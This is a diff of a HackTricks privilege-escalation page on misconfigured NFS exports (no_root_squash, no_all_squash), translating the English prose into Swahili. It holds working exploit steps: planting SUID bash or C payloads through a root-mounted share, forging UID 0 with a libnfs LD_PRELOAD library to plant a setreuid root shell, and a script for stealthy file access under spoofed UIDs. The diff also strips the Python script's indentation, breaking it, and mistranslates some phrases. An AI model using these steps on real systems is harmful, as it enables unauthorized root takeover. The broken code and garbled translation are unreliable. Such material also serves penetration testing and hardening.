@@ -1,19 +1,18 @@
 {{#include ../../banners/hacktricks-training.md}}
 
-Read the _ **/etc/exports** _ file, if you find some directory that is configured as **no_root_squash**, then you can **access** it from **as a client** and **write inside** that directory **as** if you were the local **root** of the machine.
+Soma faili _ **/etc/exports** _ , ikiwa unapata directory ambayo imewekwa kama **no_root_squash**, basi unaweza **kufikia** kutoka **kama mteja** na **kuandika ndani** ya hiyo directory **kama** ungekuwa **root** wa mashine hiyo.
 
-**no_root_squash**: This option basically gives authority to the root user on the client to access files on the NFS server as root. And this can lead to serious security implications.
+**no_root_squash**: Chaguo hili kimsingi linampa mamlaka mtumiaji root kwenye mteja kufikia faili kwenye seva ya NFS kama root. Na hii inaweza kusababisha athari mbaya za usalama.
 
-**no_all_squash:** This is similar to **no_root_squash** option but applies to **non-root users**. Imagine, you have a shell as nobody user; checked /etc/exports file; no_all_squash option is present; check /etc/passwd file; emulate a non-root user; create a suid file as that user (by mounting using nfs). Execute the suid as nobody user and become different user.
+**no_all_squash:** Hii ni sawa na chaguo la **no_root_squash** lakini inatumika kwa **watumiaji wasiokuwa root**. Fikiria, una shell kama mtumiaji nobody; umeangalia faili ya /etc/exports; chaguo la no_all_squash lipo; angalia faili ya /etc/passwd; fanya kama mtumiaji asiye root; tengeneza faili ya suid kama mtumiaji huyo (kwa kuunganisha kwa kutumia nfs). Tekeleza suid kama mtumiaji nobody na kuwa mtumiaji tofauti.
 
 # Privilege Escalation
 
 ## Remote Exploit
 
-If you have found this vulnerability, you can exploit it:
+Ikiwa umepata udhaifu huu, unaweza kuutumia:
 
-- **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder the **/bin/bash** binary and giving it **SUID** rights, and **executing from the victim** machine that bash binary.
-
+- **Kuweka hiyo directory** kwenye mashine ya mteja, na **kama root kunakili** ndani ya folda iliyounganishwa faili ya **/bin/bash** na kuipa haki za **SUID**, na **kutekeleza kutoka kwa mashine** ya mwathirika hiyo binary ya bash.
 ```bash
 #Attacker, as root user
 mkdir /tmp/pe
@@ -26,9 +25,7 @@ chmod +s bash
 cd <SHAREDD_FOLDER>
 ./bash -p #ROOT shell
 ```
-
-- **Mounting that directory** in a client machine, and **as root copying** inside the mounted folder our come compiled payload that will abuse the SUID permission, give to it **SUID** rights, and **execute from the victim** machine that binary (you can find here some[ C SUID payloads](payloads-to-execute.md#c)).
-
+- **Kuweka hiyo directory** kwenye mashine ya mteja, na **kama root kunakili** ndani ya folda iliyowekwa payload yetu iliyotengenezwa ambayo itatumia ruhusa ya SUID, itapeleka **SUID** haki, na **kuitekeleza kutoka kwa** mashine ya mwathirika hiyo binary (unaweza kupata hapa baadhi ya [C SUID payloads](payloads-to-execute.md#c)).
 ```bash
 #Attacker, as root user
 gcc payload.c -o payload
@@ -42,61 +39,57 @@ chmod +s payload
 cd <SHAREDD_FOLDER>
 ./payload #ROOT shell
 ```
-
 ## Local Exploit
 
 > [!NOTE]
-> Note that if you can create a **tunnel from your machine to the victim machine you can still use the Remote version to exploit this privilege escalation tunnelling the required ports**.\
-> The following trick is in case the file `/etc/exports` **indicates an IP**. In this case you **won't be able to use** in any case the **remote exploit** and you will need to **abuse this trick**.\
-> Another required requirement for the exploit to work is that **the export inside `/etc/export`** **must be using the `insecure` flag**.\
-> --_I'm not sure that if `/etc/export` is indicating an IP address this trick will work_--
+> Kumbuka kwamba ikiwa unaweza kuunda **tunnel kutoka kwa mashine yako hadi mashine ya mwathirika unaweza bado kutumia toleo la Remote kutekeleza kupanda kwa haki hii kwa kutunga bandari zinazohitajika**.\
+> Huu ni ujanja wa kufuata ikiwa faili `/etc/exports` **inaonyesha IP**. Katika kesi hii **hutaweza kutumia** kwa hali yoyote **exploit ya mbali** na utahitaji **kudhulumu ujanja huu**.\
+> Sharti lingine muhimu ili exploit ifanye kazi ni kwamba **export ndani ya `/etc/export`** **lazima litumie bendera ya `insecure`**.\
+> --_Sijui kama `/etc/export` inaonyesha anwani ya IP ujanja huu utafanya kazi_--
 
 ## Basic Information
 
-The scenario involves exploiting a mounted NFS share on a local machine, leveraging a flaw in the NFSv3 specification which allows the client to specify its uid/gid, potentially enabling unauthorized access. The exploitation involves using [libnfs](https://github.com/sahlberg/libnfs), a library that allows for the forging of NFS RPC calls.
+Hali hii inahusisha kutumia NFS share iliyowekwa kwenye mashine ya ndani, ikitumia kasoro katika spesifikesheni ya NFSv3 ambayo inaruhusu mteja kubainisha uid/gid yake, ambayo inaweza kuwezesha ufikiaji usioidhinishwa. Kutekeleza kunahusisha kutumia [libnfs](https://github.com/sahlberg/libnfs), maktaba inayoruhusu kutunga wito wa NFS RPC.
 
 ### Compiling the Library
 
-The library compilation steps might require adjustments based on the kernel version. In this specific case, the fallocate syscalls were commented out. The compilation process involves the following commands:
-
+Hatua za ukusanyaji wa maktaba zinaweza kuhitaji marekebisho kulingana na toleo la kernel. Katika kesi hii maalum, syscalls za fallocate zilikuwa zimeandikwa nje. Mchakato wa ukusanyaji unajumuisha amri zifuatazo:
 ```bash
 ./bootstrap
 ./configure
 make
 gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
 ```
+### Kufanya Uhalifu
 
-### Conducting the Exploit
+Uhalifu unahusisha kuunda programu rahisi ya C (`pwn.c`) inayoinua mamlaka hadi root na kisha kutekeleza shell. Programu inakusanywa, na binary inayotokana (`a.out`) inawekwa kwenye sehemu yenye suid root, ikitumia `ld_nfs.so` kudanganya uid katika wito za RPC:
 
-The exploit involves creating a simple C program (`pwn.c`) that elevates privileges to root and then executing a shell. The program is compiled, and the resulting binary (`a.out`) is placed on the share with suid root, using `ld_nfs.so` to fake the uid in the RPC calls:
+1. **Kusanya msimbo wa uhalifu:**
 
-1. **Compile the exploit code:**
+```bash
+cat pwn.c
+int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
+gcc pwn.c -o a.out
+```
 
-   ```bash
-   cat pwn.c
-   int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
-   gcc pwn.c -o a.out
-   ```
+2. **Weka uhalifu kwenye sehemu na badilisha ruhusa zake kwa kudanganya uid:**
 
-2. **Place the exploit on the share and modify its permissions by faking the uid:**
+```bash
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
+LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
+```
 
-   ```bash
-   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
-   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
-   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
-   LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
-   ```
+3. **Tekeleza uhalifu ili kupata mamlaka ya root:**
+```bash
+/mnt/share/a.out
+#root
+```
 
-3. **Execute the exploit to gain root privileges:**
-   ```bash
-   /mnt/share/a.out
-   #root
-   ```
+## Bonus: NFShell kwa Ufikiaji wa Faili wa Siri
 
-## Bonus: NFShell for Stealthy File Access
-
-Once root access is obtained, to interact with the NFS share without changing ownership (to avoid leaving traces), a Python script (nfsh.py) is used. This script adjusts the uid to match that of the file being accessed, allowing for interaction with files on the share without permission issues:
-
+Mara tu ufikiaji wa root unapopatikana, ili kuingiliana na sehemu ya NFS bila kubadilisha umiliki (ili kuepuka kuacha alama), skripti ya Python (nfsh.py) inatumika. Skripti hii inarekebisha uid ili kuendana na ile ya faili inayofikiwa, ikiruhusu kuingiliana na faili kwenye sehemu bila matatizo ya ruhusa:
 ```python
 #!/usr/bin/env python
 # script from https://www.errno.fr/nfs_privesc.html
@@ -104,23 +97,20 @@ import sys
 import os
 
 def get_file_uid(filepath):
-    try:
-        uid = os.stat(filepath).st_uid
-    except OSError as e:
-        return get_file_uid(os.path.dirname(filepath))
-    return uid
+try:
+uid = os.stat(filepath).st_uid
+except OSError as e:
+return get_file_uid(os.path.dirname(filepath))
+return uid
 
 filepath = sys.argv[-1]
 uid = get_file_uid(filepath)
 os.setreuid(uid, uid)
 os.system(' '.join(sys.argv[1:]))
 ```
-
-Run like:
-
+Kimbia kama:
 ```bash
 # ll ./mount/
 drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
 ```
-
 {{#include ../../banners/hacktricks-training.md}}
